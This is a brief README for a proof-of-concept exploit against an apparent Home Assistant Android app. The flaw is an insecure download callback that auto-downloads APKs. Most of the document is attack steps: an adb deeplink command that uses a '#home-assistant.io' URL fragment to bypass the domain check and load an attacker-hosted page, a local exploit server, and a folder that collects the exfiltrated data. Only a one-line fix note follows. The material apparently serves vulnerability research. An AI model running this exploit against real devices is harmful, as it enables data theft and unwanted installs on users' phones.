# 3.1.2_Insecure_Download_Callback - Auto Download Exploit

## Vulnerability
DownloadListener auto-downloads APKs without domain check

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/3.1.2_Insecure_Download_Callback.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
